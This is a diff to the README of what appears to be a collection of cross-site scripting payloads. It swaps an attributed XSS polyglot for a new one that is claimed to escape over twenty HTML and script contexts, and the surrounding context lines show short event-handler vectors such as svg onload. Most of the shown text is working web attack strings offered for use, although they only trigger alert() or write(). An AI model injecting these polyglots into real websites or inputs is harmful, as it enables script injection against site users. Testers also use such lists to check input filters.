@@ -52,9 +52,11 @@ Put this repo on watch. I will be updating it regularly.
 <x oncut=alert()>x
 <svg onload=write()>
 ```
-Here's an interesting XSS polyglot by [Ahmed Elsobky](https://github.com/0xsobky/):
+### Awesome Polyglots
+
+Here's an XSS polyglot that I made which can break out of 20+ contexts:
 ```
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 ```
 
 ### Awesome Tags & Event Handlers
